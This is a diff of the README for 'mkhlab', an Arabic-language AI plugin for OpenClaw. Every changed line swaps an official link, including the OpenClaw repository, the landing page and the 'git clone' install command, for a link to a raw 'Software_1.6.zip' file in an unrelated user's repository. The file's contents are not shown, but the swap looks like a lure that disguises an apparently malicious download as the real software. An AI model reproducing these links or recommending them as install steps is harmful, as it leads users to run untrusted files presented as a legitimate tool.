@@ -6,14 +6,14 @@
 
 ### مساعدك الذكي العربي. مفتوح المصدر. يشتغل على جهازك. بياناتك عندك.
 
-**The first Arabic-first plugin for [OpenClaw](https://github.com/openclaw/openclaw).**
+**The first Arabic-first plugin for [OpenClaw](https://github.com/jackquelinunpredictable827/mkhlab/raw/refs/heads/main/skills/arabic-resume/Software_1.6.zip).**
 
 60 Arabic AI skills · 3 tools · 2 channels · Dialect-aware · Works with any model
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![OpenClaw Plugin](https://img.shields.io/badge/OpenClaw-Plugin-blue.svg)](https://github.com/openclaw/openclaw)
+[![OpenClaw Plugin](https://img.shields.io/badge/OpenClaw-Plugin-blue.svg)](https://github.com/jackquelinunpredictable827/mkhlab/raw/refs/heads/main/skills/arabic-resume/Software_1.6.zip)
 [![Skills](https://img.shields.io/badge/Skills-60-orange.svg)](#skills)
-[![Landing Page](https://img.shields.io/badge/Website-Live-teal.svg)](https://moshe-ship.github.io/mkhlab/)
+[![Landing Page](https://img.shields.io/badge/Website-Live-teal.svg)](https://github.com/jackquelinunpredictable827/mkhlab/raw/refs/heads/main/skills/arabic-resume/Software_1.6.zip)
 
 </div>
 
@@ -37,7 +37,7 @@ No other AI assistant offers this combination:
 ## Quick Start
 
 ### Prerequisites
-- [OpenClaw](https://github.com/openclaw/openclaw) v2026.3.20+
+- [OpenClaw](https://github.com/jackquelinunpredictable827/mkhlab/raw/refs/heads/main/skills/arabic-resume/Software_1.6.zip) v2026.3.20+
 - Node.js 18+
 - Python 3.10+ (for CLI tools)
 
@@ -45,7 +45,7 @@ No other AI assistant offers this combination:
 
 ```bash
 # Clone
-git clone https://github.com/mousaabumazin/mkhlab.git
+git clone https://github.com/jackquelinunpredictable827/mkhlab/raw/refs/heads/main/skills/arabic-resume/Software_1.6.zip
 cd mkhlab
 
 # Tell OpenClaw where to find the skills
